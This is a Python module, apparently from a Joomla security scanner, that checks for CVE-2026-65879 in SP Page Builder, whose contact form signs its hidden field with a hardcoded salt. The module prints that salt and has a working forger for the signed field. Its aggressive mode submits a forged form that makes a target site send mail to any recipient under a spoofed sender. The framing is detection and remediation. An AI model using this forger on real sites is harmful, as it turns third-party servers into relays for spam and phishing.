from __future__ import annotations

import base64
import hashlib
import json
import re
from typing import Any
from urllib.parse import urlencode

from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.probes import extract_csrf_from_html
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-65879"
NAME = "SP Page Builder hardcoded mail-relay secret"
COMPONENT = "SP Page Builder"
AFFECTED_RULE = "SP Page Builder 1.0.0 through 6.7.0; fixed in 6.7.1"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
AJAX_PATH = "/index.php?option=com_sppagebuilder&task=ajax&addon=ajax_contact"
# site/addons/ajax_contact/site.php and form_builder/site.php in every
# release up to 6.7.0 ship this identical product-wide salt.
SALT = "3a1q3ko70zwa2lxnui73qk3hm7g2xq6oe7bi0ydk0eulifabjb"


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    fixed = parse_version_safe("6.7.1")
    if parsed is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def _b64(value: str) -> str:
    return base64.b64encode(value.encode()).decode()


def forge_form_id(recipient: str, from_email: str, from_name: str = "ProofCMS", salt: str = SALT) -> str:
    """Build the signed ``form_id`` hidden field from the public salt."""
    hidden = {
        "recipient_email": _b64(recipient),
        "from_email": _b64(from_email),
        "from_name": _b64(from_name),
        "send_copy_to_applicant": _b64("0"),
    }
    hidden_base64 = _b64(json.dumps(hidden, separators=(",", ":")))
    signature = hashlib.md5((salt + hidden_base64).encode()).hexdigest()
    return f"{hidden_base64}:{signature}"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("sppagebuilder", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="SP Page Builder was not detected through its public manifest or asset paths.", action="No action is required unless SP Page Builder is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected SP Page Builder {version}; the contact-form addons ship one product-wide salt, so any visitor can forge the signed recipient/from field."
        action = "Upgrade SP Page Builder to 6.7.1 or newer and review outbound mail for spoofed form senders."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected SP Page Builder {version}, which derives the form signature from a per-install secret."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "SP Page Builder was detected, but its version could not be determined."
        action = "Determine the installed SP Page Builder version and upgrade to 6.7.1 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def run_aggressive_probe(
    target_url: str,
    recipient: str = "attacker@example.test",
    from_email: str = "spoofed@example.test",
    page_id: int = 1,
    addon_id: str = "proofcms-contact",
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Submit a contact form with an offline-forged recipient/from signature.

    6.7.0 and earlier sign the hidden ``form_id`` with a salt hardcoded in the
    shipped addon source. Anyone with a copy of the extension can forge it and
    make the site send mail to an arbitrary recipient with a spoofed sender.
    6.7.1+ derives the signature from a per-install secret, so the same forged
    value is rejected with ``Restricted Access``.
    """
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    home = client.get(f"{base}/index.php", timeout=timeout)
    if is_transport_error(home):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{AJAX_PATH}", detail=f"The public page could not be reached ({transport_error_detail(home)}).", action="Retry when the target is reachable.")
    token = extract_csrf_from_html(str(home.get("body") or "")) or ""
    fields: list[tuple[str, str]] = [
        ("id", str(page_id)),
        ("view_type", "page"),
        ("data[0][name]", "form_id"),
        ("data[0][value]", forge_form_id(recipient, from_email)),
        ("data[1][name]", "addon_id"),
        ("data[1][value]", addon_id),
        ("data[2][name]", "email"),
        ("data[2][value]", "applicant@example.test"),
        ("data[3][name]", "name"),
        ("data[3][value]", "ProofCMS"),
        ("data[4][name]", "message"),
        ("data[4][value]", "ProofCMS 65879 relay probe"),
        ("data[5][name]", "captcha_type"),
        ("data[5][value]", "default"),
        ("data[6][name]", "captcha_question"),
        ("data[6][value]", "proofcms"),
        ("data[7][name]", "captcha_answer"),
        ("data[7][value]", hashlib.md5(b"proofcms").hexdigest()),
    ]
    if token:
        fields.append((token, "1"))
    url = f"{base}{AJAX_PATH}"
    response = client.request(url, method="POST", headers={"Content-Type": "application/x-www-form-urlencoded"}, data=urlencode(fields).encode(), timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The form submission failed in transit ({transport_error_detail(response)}).", action="Retry when the target is reachable.")

    body = str(response.get("body") or "")
    inner: dict[str, Any] = {}
    try:
        outer = json.loads(body)
        if isinstance(outer, dict):
            payload = outer.get("data")
            inner = json.loads(payload) if isinstance(payload, str) else (payload if isinstance(payload, dict) else outer)
    except (json.JSONDecodeError, TypeError):
        inner = {}
    sent = bool(inner.get("status")) and "Restricted Access" not in body
    evidence = {
        "recipient": recipient,
        "from_email": from_email,
        "page_id": page_id,
        "addon_id": addon_id,
        "csrf_token_sent": bool(token),
        "response_status": response.get("status"),
        "body_excerpt": body[:300],
    }
    if sent:
        return Finding(cve=CVE_ID, name=NAME, status="VULNERABLE", confidence="CONFIRMED", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, evidence=evidence, detail=f"The contact form accepted a signature forged from the product-wide salt and reported a successful send to {recipient} with sender {from_email}. Verify delivery with the lab SMTP sink.", action="Upgrade SP Page Builder to 6.7.1 or newer and review outbound mail for spoofed form senders.")
    if "Restricted Access" in body or "FAILED" in body:
        return Finding(cve=CVE_ID, name=NAME, status="NOT_AFFECTED", confidence="HIGH", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, evidence=evidence, detail="The contact form rejected the forged signature; 6.7.1+ binds the signature to a per-install secret.", action="No action is required if the installed version is 6.7.1 or newer.")
    return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, evidence=evidence, detail="The contact form response did not report a successful send or the patched rejection.", action="Check the page id, addon id and mail configuration before retrying.")


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    url = f"{base}/index.php?option=com_sppagebuilder"
    response = HttpClient(timeout=timeout, proxy=proxy).get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The component route could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable.")
    return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail="The component is reachable; no forged mail payload was sent in safe mode.", action="Use aggressive mode on an authorized staging site with an SMTP sink.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    from ...core.args import aggressive_value

    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because SP Page Builder was not detected as potentially affected."
            return passive
        result = run_aggressive_probe(
            target_url,
            recipient=aggressive_value(aggressive_args, aggressive_command, "recipient") or "attacker@example.test",
            from_email=aggressive_value(aggressive_args, aggressive_command, "from_email") or "spoofed@example.test",
            page_id=int(aggressive_value(aggressive_args, aggressive_command, "page_id") or 1),
            addon_id=aggressive_value(aggressive_args, aggressive_command, "addon_id") or "proofcms-contact",
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (component reachability) and aggressive (forged form signature) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "Use of Hard-coded Credentials / Mail Relay", "module_version": "1.1.0", "last_reviewed": "2026-11-20", "updated": "2026-11-20", "required_detectors": ["sppagebuilder"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-65879", "https://github.com/advisories/GHSA-9v52-pgw4-78ww", "https://mysites.guru/blog/sp-page-builder-sql-injection-mail-relay-disclosure/"]}
